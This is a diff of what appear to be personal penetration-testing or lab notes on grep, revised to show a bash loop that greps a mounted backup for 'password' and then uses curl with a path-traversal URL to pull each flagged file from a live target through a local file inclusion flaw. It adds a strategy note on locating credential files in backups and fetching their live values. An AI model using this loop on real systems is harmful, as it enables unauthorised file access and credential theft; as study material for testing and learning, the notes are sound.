@@ -75,17 +75,20 @@ grep -Rin password /etc/freeswitch/
 # → filename:42:the matching line              (file + line number + content)
 ```
 
-Grepping for the **content** is the default first move. `-l` (filename-only) is for two specific jobs:
+Content grep is the default. Use `-l` (filenames-only) to **build a list to feed another tool** (you loop over filenames, not matching lines) or to **cut noise** (collapse hundreds of hits to which files matter).
 
-1. **Build a list to feed another command.** You can't loop over "matching lines" — you loop over **filenames**. `grep -Ril` gives a clean list to drop into a file and iterate. **Anchor the paths to the *target's* root, not your mount point** — `cd` into the mount and `sed`-strip the leading `.`, otherwise you get `/mnt/...` paths that don't exist on the target and every fetch returns the app's index page:
-   ```bash
-   cd /mnt && grep -Ril password . | sed 's#^\.#/#' > tmp        # → /etc/..., not /mnt/etc/...
-   for i in $(cat tmp); do
-     curl -s --path-as-is "http://<IP>/../../../../../../..$i" -o "loot/$(echo "$i" | tr '/' '_')"
-   done
-   ```
-   This is the bridge between "which files mention it" and "fetch each one." Write **one file per result** with `-o`, not `>> carve` (a blob mixes hits and misses with no separators). See [[Curl]].
-2. **Noise reduction.** When a recursive search returns hundreds of matching lines across logs and binaries, `-l` collapses it to *which files even matter* so you know what to open.
+```bash
+grep -Ril password /mnt | sed 's#^/mnt/[^/]*##' > tmp
+for i in $(cat tmp); do
+  curl -s --path-as-is "http://<IP>:3000/../../../../../../../../..$i" -o "$(echo "$i" | tr '/' '_')"
+done
+grep -Ri password .
+```
+→ Carve every flagged file through the LFI. `sed 's#^/mnt/[^/]*##'` strips the mount **and** the share's top folder so paths are real target paths (`/etc/...`), not `/mnt/freeswitch/etc/...`. `-o` with no slash = file lands in the current dir; `tr '/' '_'` flattens the path into the filename. See [[Curl]].
+
+> **Backup shares nest under a per-service dir** (`/mnt/freeswitch/etc/...` → live `/etc/...`). Stripping only `/mnt` leaves a `/freeswitch` prefix that doesn't exist on the box — every fetch returns the same junk page. Identical-size files = all misses.
+
+> **Strategy:** grep the **backup** broad (the map of which files hold creds) → LFI that flagged set **live** for the real values. Backup tells you *where*, never trust its *values*.
 
 > **Gotcha — carving the filename out of grep output.** `grep -R` prints `filename:matchtext`. The field separator is the **colon**, not whitespace — so `awk '{print $1}'` grabs the wrong chunk. Use `-l` to get filenames directly, or `cut -d: -f1` if you must parse:
 > ```bash
